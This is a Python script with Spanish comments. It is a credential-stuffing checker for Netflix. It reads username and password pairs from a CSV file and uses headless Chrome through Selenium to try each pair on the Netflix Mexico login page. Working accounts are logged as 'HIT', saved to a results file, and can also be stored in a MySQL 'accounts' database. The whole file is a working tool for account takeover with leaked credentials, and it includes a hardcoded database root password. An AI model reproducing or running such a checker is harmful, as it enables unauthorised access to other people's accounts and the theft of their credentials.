import os.path
import csv
import locale
import time
import mysql.connector
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from tqdm import tqdm
from datetime import datetime
from colorama import Fore

def iniciar_sesion(usuario, contrasena, credenciales_validas):
    driver = None  # Inicializar a None para el caso en que ocurra una excepción antes de asignar el controlador

    try:
        # Inicializar el navegador Chrome
        chrome_options = Options()
        chrome_options.add_argument('--headless')  # Habilita el modo headless
        chrome_options.add_argument("--disable-logging")  # Desactivar los logs de DevTools
        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
        driver = webdriver.Chrome(options=chrome_options)

        # Acceder a la página de inicio de sesión de Netflix
        driver.get('https://www.netflix.com/mx/login')

        # Esperar hasta que aparezca el campo de usuario
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'userLoginId'))
        )
        username_field.send_keys(usuario)

        # Esperar hasta que aparezca el campo de contraseña y hacer clic en 'Iniciar Sesión'
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'password'))
        )
        password_field.send_keys(contrasena)

        submit = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div[1]/form/button'))
        )
        submit.click()

        # Esperar a que la página se cargue completamente después de iniciar sesión
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.CLASS_NAME, 'profile-icon'))
        )

        # Verificar si hay un mensaje de error
        error_message = driver.find_elements(By.CLASS_NAME, 'ui-message-container.ui-message-error')
        if error_message:
            print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
            )
        else:
            print(
                f"[{Fore.GREEN}+{Fore.RESET}] {Fore.GREEN}HIT{Fore.RESET} | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} funcionan correctamente"
            )
            credenciales_validas.append((usuario, contrasena))

    except WebDriverException as e:
        print(
                f"[{Fore.RED}!{Fore.RESET}] {Fore.RED}ERROR{Fore.RESET} | Las credenciales {Fore.RED}{usuario}:{contrasena}{Fore.RESET}   no funcionan... Intentando con el siguiente conjunto"
            )
    except Exception as e:
        # Imprimir el mensaje de error específico si lo hay
        print(f"Error inesperado: {str(e)}")
    finally:
        # Cerrar el navegador en cualquier caso
        if driver:
            driver.quit()

# Función para guardar en la base de datos
def guardar_en_base_de_datos(usuario, contrasena):
    try:
        # Configurar la conexión a la base de datos
        conexion = mysql.connector.connect(
            host="127.0.0.1",
            user="root",
            password="cazarezf97",
            database="accounts"
        )

        # Crear un cursor para ejecutar consultas SQL
        cursor = conexion.cursor()

        # Consulta SQL para verificar si ya existen las credenciales
        consulta_select = "SELECT * FROM netflix WHERE username = %s AND password = %s"
        datos_select = (usuario, contrasena)

        # Ejecutar la consulta SELECT
        cursor.execute(consulta_select, datos_select)

        # Obtener los resultados
        resultados = cursor.fetchall()

        # Verificar si ya existen registros con las mismas credenciales
        if resultados:
            print(f"[{Fore.YELLOW}⚠{Fore.RESET}] | Las credenciales {Fore.YELLOW}{usuario}:{contrasena}{Fore.RESET} ya existen en la base de datos. No se realizará la inserción.")
        else:
            # Consulta SQL para insertar las credenciales en la tabla
            consulta_insert = "INSERT INTO netflix (idAccount, username, password, dateAdded) VALUES (NULL, %s, %s, %s)"
            datos_insert = (usuario, contrasena,datetime.now())

            # Ejecutar la consulta INSERT
            cursor.execute(consulta_insert, datos_insert)

            # Confirmar la transacción
            conexion.commit()

            print(f"[{Fore.GREEN}✓{Fore.RESET}] | Las credenciales {Fore.GREEN}{usuario}:{contrasena}{Fore.RESET} han sido guradadas en la base de datos")

    except mysql.connector.Error as error:
        print(f"[{Fore.RED}X{Fore.RESET}] Error al guardar en la base de datos: {error}")
    finally:
        # Cerrar el cursor y la conexión
        if 'cursor' in locals():
            cursor.close()
        if 'conexion' in locals():
            conexion.close()


# Ruta al archivo CSV con las credenciales
csv_file_path = 'csv/data_netflix.csv'
credenciales_validas = []

# Verificar si el archivo CSV existe
if os.path.isfile(csv_file_path):
    # Obtener el número total de líneas en el archivo CSV
    total_lines = sum(1 for line in open(csv_file_path))

    # Abrir el archivo CSV con tqdm
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        # Iterar sobre cada línea del archivo CSV con tqdm
        for line in tqdm(csv_reader, total=total_lines, desc="Procesando credenciales", unit=" línea"):
            usuario = line[0]
            contrasena = line[1]

            # Intentar iniciar sesión con las credenciales actuales
            iniciar_sesion(usuario, contrasena, credenciales_validas)


# Guardar las credenciales válidas en un archivo .csv
if credenciales_validas:
    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
    now = datetime.now()
    format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo

    # Cabeceras
    headers = ['Username', 'Password']

    # Guardar las credenciales válidas en un archivo .csv
    file_path = f'results/credenciales_validas_netflix_{format_date}.csv'
    with open(file_path, 'w', newline='') as csv_file:
        # Escribir cabeceras y luego credenciales
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(headers)

        for credencial in credenciales_validas:
            csv_writer.writerow(credencial)

    print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en {file_path}")

    # Verificar si hay credenciales antes de intentar guardar en la base de datos
    if credenciales_validas:
        # Preguntar al usuario si desea guardar en la base de datos MySQL
        respuesta = input("¿Deseas guardar las credenciales válidas en la base de datos MySQL? (y/n): ").lower()
        if respuesta == 'y':
            for credencial in credenciales_validas:
                guardar_en_base_de_datos(*credencial)
            print(f"[{Fore.GREEN}✓{Fore.RESET}] | Credenciales válidas guardadas en la base de datos MySQL.")
        else:
             print(f"{Fore.RED}No{Fore.RESET} hay credenciales para guardar en la base de datos MySQL.")
    else:
        print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales para guardar en la base de datos MySQL.")

else:
    print(f"[{Fore.RED}X{Fore.RESET}] | No hay credenciales válidas para guardar.")
